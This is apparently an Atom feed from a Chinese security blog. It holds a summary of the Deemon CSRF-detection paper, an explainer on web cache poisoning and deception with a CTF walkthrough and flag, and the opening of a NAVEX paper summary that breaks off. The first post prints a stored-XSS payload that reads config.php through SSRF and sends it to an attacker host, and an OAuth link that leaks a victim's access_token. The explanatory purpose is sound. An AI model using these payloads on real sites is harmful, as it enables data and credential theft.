<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2020-06-21T09:53:57.763Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Paper Summary &amp; Deemon &amp; Detecting CSRF with Dynamic Analysis and Property Graphs</title>
    <link href="http://skysec.top/2020/05/29/Deemon%20&amp;%20CSRF%E6%BC%8F%E6%B4%9E%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
    <id>http://skysec.top/2020/05/29/Deemon &amp; CSRF漏洞动态分析工具/</id>
    <published>2020-05-29T02:23:34.000Z</published>
    <updated>2020-06-21T09:53:57.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前端的攻击中，一般活跃在大家视线里的可能都是xss居多，对于csrf这一块正好我也抱着学习的心态，了解到安全顶会有一篇自动化挖掘CSRF漏洞的paper，于是看了看，以下是相关知识分享。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CSRF可以分为两种，一种是authenticated CSRF，一种是login CSRF。</p><h3 id="login-CSRF"><a href="#login-CSRF" class="headerlink" title="login CSRF"></a>login CSRF</h3><p>对于login CSRF，这里我们以曾经的价值8000美金的Uber漏洞为例：<br>在网站中，登录流程机制大致如下：<br><img src="/images/2020-05-06-19-28-55.png" alt=""><br>如果我们将somewhere改为google.com，那么流程将变为：<br><img src="/images/2020-05-06-19-29-05.png" alt=""><br>此时可以发现网站存在重定向的漏洞。如果此处我们将<code>response_type=code</code>改为<code>response_type=token</code>:<br><img src="/images/2020-05-06-19-29-13.png" alt=""><br>由于Oauth请求使用的是code并非access_token，所以此处重定向失败。<br>那么此处可以引入login CSRF攻击，为oauth2-callback节点提供有效的code值，那么即可将受害者的access_token带出重定向到我们的网站。<br><img src="/images/2020-05-06-19-29-23.png" alt=""><br>那么只要受害者点击链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://login.uber.com/oauth/authorize?response_type=token&amp;scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3d&#123;攻击者的有效OAuth code&#125;&amp;state=%2F%2f攻击者控制的站点</span><br></pre></td></tr></table></figure></p><p>攻击者即可在网站<code>hackerone.com</code>收到受害者的access_token。</p><h3 id="authenticated-CSRF"><a href="#authenticated-CSRF" class="headerlink" title="authenticated CSRF"></a>authenticated CSRF</h3><p><img src="/images/2020-04-28-11-08-52.png" alt=""><br>对于authenticated CSRF其实容易理解很多，即在用户登录后的页面里插入evil html，这里的方式可以多样化，例如可以利用xss，插入 HTML iframe tag，或者 self-submitting JavaScript code, 又或是使用XMLHttpRequest JavaScript API等等。<br>这里可以以一道CTF题目为例：<a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">https://xssrf.hackme.inndy.tw/</a><br>详细的题解可以参考我这篇文章：<a href="https://skysec.top/2018/08/17/xss-ssrf-redis/">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br>这里我们简单提一下：<br>题目允许攻击者使用xss在发邮件处进行攻击，我们可以发送如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>当受害者访问到该存储性xss会显示的页面，即会自动使用request.php页面，发送post请求，访问file:///var/www/html/config.php，同时会将response重定向发送到我们的攻击服务器：<a href="http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText)，我们即可完成攻击，利用受害者获取一些数据。" target="_blank" rel="noopener">http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText)，我们即可完成攻击，利用受害者获取一些数据。</a></p><h3 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h3><p>两者区别在于authenticated CSRF建立于受害者已经登录授权后的攻击，而login CSRF的目的是让受害者使用攻击者的登录凭证。前者即利用登录后的受害者进行一些需要授权的操作，例如转账等等。而后者更倾向于攻击者利用自己的证书，让受害者登录。<br>而本篇文章中，作者主要研究的是authenticated CSRF的自动化动态分析和挖掘。</p><h2 id="工具设计难题"><a href="#工具设计难题" class="headerlink" title="工具设计难题"></a>工具设计难题</h2><p>在设计中作者遇到了两方面的难题，一个是detection challenges，另一个是operational challenges。</p><h3 id="detection-challenges"><a href="#detection-challenges" class="headerlink" title="detection challenges"></a>detection challenges</h3><ul><li>C1 State Transitions<br>由于在web程序里存在大量的状态转换，例如，用户更改密码后，旧密码不再被使用，此时即是一次状态转换。<br>这样的问题在sql注入或者xss攻击的fuzz工具中可能影响并不是很大，但在CSRF中就会有较多的干扰，所以现在的模型难以直接牵引至aCSRF的fuzz工具中。那么如何确定何时发生状态转换，成为了一个难题。</li><li>C2 Security-Relevant State Changes<br>状态改变的操作很多，但如何识别哪些状态改变是和安全相关的，这成为了一个难题。</li><li>C3 Relationships of Request Parameters and State Transitions<br>例如如下请求：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?newpassword=123123</span><br></pre></td></tr></table></figure></li></ul><p>对于上述链接，工具可能无法知道newpassword这个参数会带来状态转换，这是一个更改密码的操作，且新密码是123123。所以如何确定请求参数和状态转换之间的关系，成为一个难题。</p><h3 id="operational-challenges"><a href="#operational-challenges" class="headerlink" title="operational challenges"></a>operational challenges</h3><ul><li>C4 Transitions in Non-Trivial Application Workflows<br>在Web程序中，经常需要一系列操作后，才能达到更改某个状态的目的，但现有的工具并不能比较好的处理这一系列复杂的操作，静态分析中也存在这样的缺陷。那么如何在较为复杂的web工作流程中找到导致状态变化的请求，成为了一个难题。</li><li>C5 Side-Effect-Free Testing<br>测试中引起的状态变化的副作用是不可逆的，例如在购物车界面，如果我们随机测试，清空了购物车，那么后续的测试将难以进行，这一状态根据现有工具很难逆转。</li><li>C6 Comprehensive, Reusable Representation of Application Functionality<br>在解决aCSRF工具的问题时，会用到许多的模型，但是模型之间可能使用了不同的语言，并且他们之间可能关系复杂，如何将这些模型高效的凝结在一起，使我们可以建立全面的，可重用的应用程序功能表示，成为了一个难题。</li></ul><h2 id="工具设计方法"><a href="#工具设计方法" class="headerlink" title="工具设计方法"></a>工具设计方法</h2><h3 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h3><p>作者为克服上述困难，开发工具基于php后端，mysql数据库的aCSRF自动检测工具：Deemon。</p><ul><li>C1 &amp; C3<br>为了解决C1和C3的难题，Deemon从程序执行观察中推断状态转换和数据流信息的模型。</li><li>C6<br>为了解决C6的难题，Deemon使用属性图来描绘不同模型之间的精准关系。</li><li>C2<br>为了解决C2的问题，Deemon使用图遍历的思想来识别与安全相关的更改操作。</li><li>C4<br>为了解决C4的问题，Deemon在web执行环境中加入一些传感器，并重新生成一组用户操作，用以观察服务器端程序的执行。</li><li>C5<br>最后，为了解决C5的问题，Deemon依赖于虚拟化环境来测试web应用程序，因此可以使用拍摄和恢复快照来解决副作用不可逆的难题。<br>工具需要web应用程序容器和一组用户操作作为输入，且Deemon的执行分为两部分：instrumentation和detection。<br>在instrumentation部分，Deemon会修改web应用程序容器，在其中插入传感器，用于提取网络跟踪、服务端执行流程和数据库操作。而在detection部分，Deemon会自动复制用户的操作，从结果跟踪推断模型，并测试程序中的aCSRF漏洞。<br>那么对于input，我们输入的用户操作，一般是测试人员提供的一组用户操作序列，例如用户在UI界面上的操作，诸如鼠标点击、html表单提交等等，那么这一系列的操作会被转化为input : 用户加载index.php，然后点击更改密码链接，然后输入新的用户密码，点击提交。<br>对于instrumentation部分，由于Deemon是以php为后端所设计，所以其启用了php的Xdebug模块，用以观察程序执行流程和数据操作，同时设计了一个http本地代理，用以观察服务器和浏览器之间的http交换。<br>对于detection部分，Deemon会重复2次用户操作，并利用传感器对数据进行观察，例如查看其数据来源，并判断一些参数是否为随机数等，并从中推断出一个模型，使用模型进行安全测试和漏洞挖掘。</li></ul><h3 id="模型建立"><a href="#模型建立" class="headerlink" title="模型建立"></a>模型建立</h3><ul><li><p>Traces and Parse Trees<br>对于事件发生的顺序和原因，Deemon对其建模，节点为事件Event，其具有两种关系edge:<br>next：事件之间发生的先后顺序<br>causes：事件之间发生的因果关系<br>而对于事件的内容，Deemon也对其建模，其具有2种edge：<br>child：对http request的解析后的内容部分，用child连接节点<br>parses：http请求 / sql查询与事件的解析关系（这实际上是2个model之间的关系了）</p></li><li><p>Finite State Machines<br>Deemon基于有限状态机进行建模，设立了2种节点和3种edge:<br><img src="/images/2020-04-29-14-34-53.png" alt=""><br>State节点代表某一具体状态，StateTrans节点代表中间状态，其中trans代表由某一具体状态转移到中间状态，to代表由中间状态转移到另一具体状态，而accept表示中间状态接受某一HTTP请求从而发生状态转移（这实际上是2个model之间的关系了）。</p></li><li>Dataflow Models<br>Deemon基于数据流对某个变量进行建模，设立了1种节点，3种edge:<br>source：数据的来源<br>propag：数据之间的传递关系<br>sink：数据的最终利用节点<br>同时这里的DFM变量会和FSM状态有关系，即：has，代表某一状态拥有某个数据。<br><img src="/images/2020-04-29-14-58-44.png" alt=""><br>综合上述建模，我们可以看到在如上的请求中，其会被解析到各个model中：<br><img src="/images/2020-04-29-15-00-02.png" alt=""><br>注意到变量会有sem_type标签，该标签含义如下：<br>SU：session unique，如果变量的值在同一session中相同，但在不同session中不同，那么该值的语义类型为SU。<br>UU：user unique，如果变量值在用户追踪中相同，但是在不同用户之间不同，那么该值类型为UU。<br>CO：constant，如果变量值从未改变，全部相同，则该值类型为CO。<br>UG：user-generated ，如果变量值在数据传递propagation chain上，同时是从user action开始的，那么其语义类型为UG。<br>这样的标签可以更好的用来区分哪些是安全相关的变量，哪些是漏洞不关心的变量。</li></ul><h3 id="关系建立"><a href="#关系建立" class="headerlink" title="关系建立"></a>关系建立</h3><p>在模型建立完毕后，为了关联不同的model，作者在这里设定了一些Relationships：<br><img src="/images/2020-05-05-10-22-14.png" alt=""></p><ul><li>Dataflow Information：用来描述状态和变量之间的关系，在 DFM 和 FSM 或者 DFM 和 解析树之间出现。</li><li>Data Propagation：用来描述变量和变量之间的关系，在DFM 和 DFM之间出现。</li><li>Abstractions：描述具体的元素和抽象的元素之间的关系，比如sql查询语句，把里面变量的值删掉，生成抽象语句</li><li>Event Causality：事件发生的因果关系，例如用户点击链接和生成HTTP请求之间可能存在该关系。<br><img src="/images/2020-05-05-10-59-26.png" alt=""></li><li>Accepted Inputs：存在于HTTP请求和状态转换之间，例如一次HTTP请求导致了状态转换，则可以表达为FSM accepts HTTP Request<br><img src="/images/2020-05-05-10-57-52.png" alt=""><br>那么在最后的CSRF漏洞检测时，基于前面的模型，我们可以使用如下的方法：<br><img src="/images/2020-05-06-10-38-23.png" alt=""><br>即关注由一个http请求导致的状态转变问题。结果集如下：<br><img src="/images/2020-05-06-10-39-28.png" alt=""><br>其中q’和q’’是2种状态，tr是状态转换，pt是http请求。<br>此时会引起状态转换的http请求都会出现在Qsc的集合中，但是并非所有请求引起的状态转换都是安全相关的。例如一些数据库操作，记录用户的行为等。那么对于这一类请求，工具会做相应的筛除，这里假设安全不相关的查询可能在一次追踪中发生多次，那么只要找到这些多次的，将其筛除即可。<br>寻找方式如下：<br><img src="/images/2020-05-06-11-20-28.png" alt=""><br>找到所有这样的http请求和sql查询的对，删除AbsSQL传出边数大于1的所有对。因为我们可以认为多个请求都是在操作同一sql语句的，一般都是在做用户活动的log之类的操作。</li></ul><h2 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h2><p>作者从4个应用场景来选择了一些web application进行测试：<br><img src="/images/2020-05-05-11-33-25.png" alt=""><br>为了获取数据和捕获跟踪用于建模，工具会进行下列3种测试：</p><ul><li>只对工作流进行跟踪，不跟踪用户</li><li>对工作流和某个已存在的用户进行操作跟踪</li><li>对相同的工作流和新建立的用户进行操作跟踪<br>首先可以获取到时request请求情况：<br><img src="/images/2020-05-05-11-50-45.png" alt=""><br>其中Reqs代表的是普通的requests请求，SC Reqs代表的是会引起状态改变的requests请求，而Rel SC Reqs代表的是真正引起状态改变的requests请求，有这样的原因是web的大部分request请求都会引起某个状态的改变，但是一般其为用户session的管理，并不是我们关注的安全状态的改变。<br>对于CSRF攻击，我们知道一般可以采用CSRF token进行防御，所以在测试中，遇到了CSRF的保护的情况和没有CSRF的情况可以分为如下两类：<br><img src="/images/2020-05-05-14-40-12.png" alt=""><br>其中TCs的意思为test case，Fail为攻击失败的例子，succ为攻击成功的例子，而Expl代表成功利用的aCSRF漏洞。<br>对于易受攻击的网站，其出现的漏洞如下：<br>1.攻击者可以控制消费者的账户，并且更改其送货地址。该漏洞出现在AbanteCart上。<br>2.攻击者可以控制消费者的账户，并且更改其送货地址，也可以在消费者购物车里添加商品。该漏洞出现在OpenCart上。<br>3.攻击者可以删除网站某些功能服务，同时可以删除收件人。该漏洞出现在Mautic上。<br>4.攻击者可以创建管理员和用户，甚至可以更改开票数据，付款方式等。该漏洞出现在Simple Invoices上。<br>而对于MyBB虽然有成功的case，但是并不能成功写出exp，因为在工具测试中，将管理员的密钥当做了常量，但实际上这个值我们在真实环境中是难以获取到的。</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇CSRF自动化测试的文章，个人认为比较好的部分在于其建模，基于其完善的建模，对于漏洞的挖掘也可以变得高效而简单，值得学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在前端的攻击中，一般活跃在大家视线里的可能都是xss居多，对于csrf这一块正好我也抱着学习的心态，了解到安全顶会有一篇自动化挖掘CSRF漏
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>Web缓存利用分析(一)</title>
    <link href="http://skysec.top/2020/05/14/Web%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90(%E4%B8%80)/"/>
    <id>http://skysec.top/2020/05/14/Web缓存利用分析(一)/</id>
    <published>2020-05-14T02:21:54.000Z</published>
    <updated>2020-06-21T09:57:54.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到一些Web Cache方面的攻击，于是总结了一下，内容如下。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Cache是一种经典的用空间换时间的做法，其应用场景非常广泛，而本篇文章的聚焦点仅在于Web领域上，对于DNS等基础设施的相关cache攻击，也不在此讨论。<br>那么我们可以大致将Web Cache攻击分为2类：</p><ul><li>User Browser Cache</li><li>Web Server Cache<br>对于浏览器，我们知道在请求网站时，会遇到js，css，图片等等的加载，如果每次请求都加载一次，那么可能会消耗许多时间，因此浏览器中可引入Cache机制，用以缓存这些静态资源，以加快访问速度。<br>对于服务器，可能某个网站页面每天要被数以万计的人访问，那么如果每次都处理一次同样的请求，则会消耗大量服务器的资源，因此服务器缓存也显得尤为重要，其中CDN就是Web Server Cache的一个典例：<br><img src="/images/2020-05-07-15-40-45.png" alt=""><br>例如访问链接:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.html</span><br></pre></td></tr></table></figure></li></ul><p>在第一个人访问后，其页面response将会被CDN缓存，下一个请求者则会直接从CDN获取response，以此减轻服务器处理请求的压力，同时达到了防止Dos攻击的目的。如下图示例：<br><img src="/images/2020-05-07-15-41-57.png" alt=""><br>CDN不仅能起到防止Dos的作用，还能加快我们的请求速度，例如我们访问服务器，请求首先会被CDN处理，计算出response给我们的最优ip地址。举一个简单的例子，就好比原来只有北京一个车站卖票，南京的想要买票就要千里迢迢前往北京，而如今有了CDN就好比在南京也有卖票点，如此一来，省时省力，不仅减轻了北京卖票点的压力，也方便了顾客。<br>但凡是皆有利有弊，如果Cache被攻击者利用，也可以产生一些严重的攻击，本篇文章中，我们则聚焦于以下3种攻击：</p><ul><li>User Browser Cache Poisoning</li><li>Server Cache Poisoning</li><li>Web Cache Deception</li></ul><h2 id="User-Browser-Cache-Poisoning"><a href="#User-Browser-Cache-Poisoning" class="headerlink" title="User Browser Cache Poisoning"></a>User Browser Cache Poisoning</h2><p>对于浏览器缓存投毒，那么很好理解，其应该是影响浏览器缓存的文件，将其污染以达到攻击目的。那么可能被污染的文件有哪些呢？我们之前提过，浏览器一般缓存静态资源，那么攻击者的攻击目标也就是诸如JS、CSS的静态资源了。<br>这种攻击会产生什么样的危害呢？<br><img src="/images/2020-05-07-15-46-49.png" alt=""><br><img src="/images/2020-05-07-15-46-59.png" alt=""><br>我们可以看到，一旦我们的浏览器缓存资源被污染，当我们请求网站时，应用了污染的静态资源，则会产生xss一类的攻击。但这种攻击持久性会随缓存时间的到期而终止，又或者用户勤清缓存而解除。<br>但这样一种攻击是如何实现的呢？我们可以看下图：<br><img src="/images/2020-05-07-15-48-41.png" alt=""><br>当攻击者和受害者处于同一WiFi下，攻击者可以利用一些攻击手段，让自己成为受害者的代理，而当受害者请求目标网站资源时，攻击者可在中间修改。当目标网站response需要缓存的资源时，攻击者可将其替换为自己篡改的同名文件，以达到污染浏览器缓存的目的。<br>但考虑到缓存存在时效性，如果目标网站认为缓存过期，则污染缓存就会失效，因此如何最大化污染缓存时间成为一个新的问题，但这里我们可以采用如下做法：<br><img src="/images/2020-05-07-15-51-13.png" alt=""><br>我们可以首先对一些知名网站进行分析，查看他们缓存时间最长的文件，以决定我们污染文件的文件名。那么如何知道缓存时间呢？我们可利用Http Header的如下属性来查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control : max-age=1000</span><br></pre></td></tr></table></figure></p><p>如此一来即可水到渠成，进行用户浏览器污染。工具如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EtherDream/mitm-http-cache-poisoning.git</span><br></pre></td></tr></table></figure></p><h2 id="Server-Cache-Poisoning"><a href="#Server-Cache-Poisoning" class="headerlink" title="Server Cache Poisoning"></a>Server Cache Poisoning</h2><p>在介绍完用户浏览器投毒后，我们再来看一下服务器缓存投毒。之前我们有说过，服务器会缓存某个链接的第一个访问者的response内容，那么如果第一个人是攻击者，就很有可能让CDN错误的缓存污染内容，达成攻击：<br><img src="/images/2020-05-07-15-55-04.png" alt=""><br>但是服务器是如何判断2个请求者请求的是不是同一个页面呢？这里就要引入Cache Key的概念：<br><img src="/images/2020-05-07-15-55-41.png" alt=""><br>如上请求，服务器会判断橙色字部分，看其是否相同，若相同则对应同一个cache，但我们不难发现蓝色字体部分，此时2个访问者的response理应不同，因为他们对应的不同语言，但因为缓存机制的问题，导致第2个请求者看到了错误语言的页面。<br>再同理，我们看如下请求：<br><img src="/images/2020-05-07-15-57-27.png" alt=""><br>我们发现response页面中会拼接X-Forwarded-Host，那么假设我们是第一个请求者，此response将会被缓存，那么当下一个请求者再次访问如下链接：<br><img src="/images/2020-05-07-15-57-36.png" alt=""><br>很显然其将受到xss的攻击。<br>但是此类攻击有一个前提，即我们需要是第一个请求某个页面的人，那么如何做到这一点呢？<br><img src="/images/2020-05-07-15-59-50.png" alt=""><br>我们可以利用response里的Age和max-age，Age代表当前response的时间，而max-age代表该页面缓存何时会过期，以此我们即可计算出投毒时机。<br>那么如何保护网站免收此类攻击呢？这就要和我们之前提到的cache key有关，我们看如下请求：<br><img src="/images/2020-05-07-16-01-38.png" alt=""><br>如果我们利用Vary指定Cache Key为User-Agent，那么不仅需要2个访问者请求域名和url相同，同时需要2人拥有同样的User-Agent，才会命中同一块cache。</p><h2 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception"></a>Web Cache Deception</h2><p>在说完Web Server缓存投毒后，我们再来看一下Web缓存欺骗。相较于前两种攻击，该攻击更为普遍，利用也相对容易。不乏其在CTF中出现的频频身影。<br><img src="/images/2020-05-07-16-04-13.png" alt=""><br>我们看如上案例，我们可以诱导管理员访问链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p><p>而服务器在处理该链接时，由于test.css不存在，其会向前解析，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php</span><br></pre></td></tr></table></figure></p><p>此时response页面即为secret.php的页面内容，而CDN对此不知，其认为当请求链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p><p>response应为管理员的secret.php页面内容。<br>而后攻击者再次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p><p>CDN将作出响应，将管理员的secret.php页面内容返回，造成信息泄露。<br>那么此种攻击在2019 CyBRICS CTF Quals或2019 XCTF Final都有出现，我们以2019 CyBRICS CTF Quals的一道题为例：<br><img src="/images/2020-05-07-16-10-07.jpg" alt=""><br>题目预设了request功能，同时注意到其http header：<br><img src="/images/2020-05-07-16-10-43.jpg" alt=""><br>同时结合题目提示：cache is vulnerabilities，那么可以判断此处应该为Web缓存欺骗的情况。<br>我们需要利用request功能，让其去请求flag页面，再利用缓存信息将内容带出。<br>因此我们首先可以读取主页内容，这里构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js</span><br></pre></td></tr></table></figure></p><p>此时缓存将会将此url记录，对应内容则为index.php的内容。<br>然后我们再次访问该链接，即可获取index.php内容：<br><img src="/images/2020-05-07-16-12-38.jpg" alt=""><br>那么再让题目携带csrf-token去请求flag即可：<br><img src="/images/2020-05-07-16-13-04.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd%26flag=1</span><br></pre></td></tr></table></figure></p><p>此时再请求缓存页面，即可获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://drops.xmd5.com/static/drops/tips-9947.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-9947.html</a><br><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#Fixaref">https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#Fixaref</a><br><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf</a><br><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近看到一些Web Cache方面的攻击，于是总结了一下，内容如下。&lt;/p&gt;
&lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; c
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</title>
    <link href="http://skysec.top/2020/05/05/Paper%20Summary%20&amp;%20NAVEX-Precise%20and%20Scalable%20Exploit%20Generation%20for%20Dynamic%20Web%20Applications/"/>
    <id>http://skysec.top/2020/05/05/Paper Summary &amp; NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/</id>
    <published>2020-05-05T02:23:34.000Z</published>
    <updated>2020-06-21T09:54:23.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次介绍的是一篇发表在安全顶会2018 USENIX Security的paper，文章旨在自动化挖掘web漏洞，同时生成对应的exp，其比同类的工具拥有更高的准确度，由于其动静结合的特性，对代码也有更好的覆盖率。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先我们从如下这样一个例子切入，来简单介绍一下web漏洞自动挖掘和通常一些静态分析的工具的做法。<br>例如如下3个代码片段：<br>selectBooks.php用于选择你想要借的书，代码如下：<br><img src="/images/2020-03-22-17-48-21.png" alt=""><br>hold.php用于额外的check输入，并引导用户到下一步操作，代码如下：<br><img src="/images/2020-03-22-17-48-59.png" alt=""><br>checkout.php用于结算，代码如下：<br><img src="/images/2020-03-22-17-49-23.png" alt=""><br>我们可以看到，在这样一个简单的功能实现上，其实出现了不少潜在的漏洞函数，例如selectBooks.php中的mysql_query可能会导致sql注入，又如checkout.php中的echo可能会导致XSS漏洞。<br>那么对于一些常规的静态分析漏洞挖掘工具，他们会怎么做呢？一般情况下，其会首先全局定位到漏洞函数的位置，例如selectBooks.php的第17行，checkout.php的第15行，然后对其参数利用PDG(数据依赖)的关系进行backward反向回溯。<br>例如selectBooks.php的第17行，我们使用PDG关系回溯，可以发现其影响的关键参数有3个，分别是$book_name，$edition,$publisher。他们又分别来自第5行，第9行和第13行。此时我们又会继续对第5行，第9行和第13行继续进行PDG回溯，而后发现他们都会经过过滤函数，那么此时回溯结束，静态分析工具粗略的判断其为安全的flow，因为其参数都会经过过滤。<br>我们再看checkout.php的第15行，利用PDG进行回溯，我们可以关注到2个变量，分别是$name和$msg，而后找到第 9行和第10行，此时我们发现第10行是攻击者可控的$_GET变量，那么此时该flow会被输出，并交由运行者进行check，判断其是否为误报。而对于对9行，我们却不太那么容易找到其真实的数据依赖，因为$result实际上来自于数据库内的数据，而非直接显示在代码中。<br>那么此时一般的静态分析工具的缺点便暴露无遗，其会受到数据库查询的约束而不能准确进行分析，且由于其依赖于PDG的后向回溯，很难去发现逻辑上的漏洞。<br>同时还有一个关键的问题，仅从代码上来看，似乎$msg我们可以找到一条攻击路线，但实际上，这是需要前期铺垫的，我们必须拥有session才能到达这一步，这为人工check也增加了不少不便捷性。<br>因此，本篇paper就是旨在解决这些问题，而提出了动静结合的web漏洞挖掘工具：NAVEX</p><h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>那么我们来简单看一下，NAVEX是如何设计，用于解决上述问题的。<br>首先作者定义了一个字典：<br><img src="/images/2020-03-25-17-55-55.png" alt=""><br>其中记录一些关键的函数名，例如XSS，对应echo和print等，依次类推，作者一共记录了如下几类攻击的潜在漏洞函数：sql注入、XSS、文件包含、命令注入、代码注入和逻辑漏洞。<br>然后NAVEX一样会像平常的静态分析工具一样，对漏洞进行检测，其也会通过全局定位敏感函数，然后用上述思想，对关键变量进行PDG后向回溯，其伪代码如下：<br><img src="/images/2020-03-25-09-37-30.png" 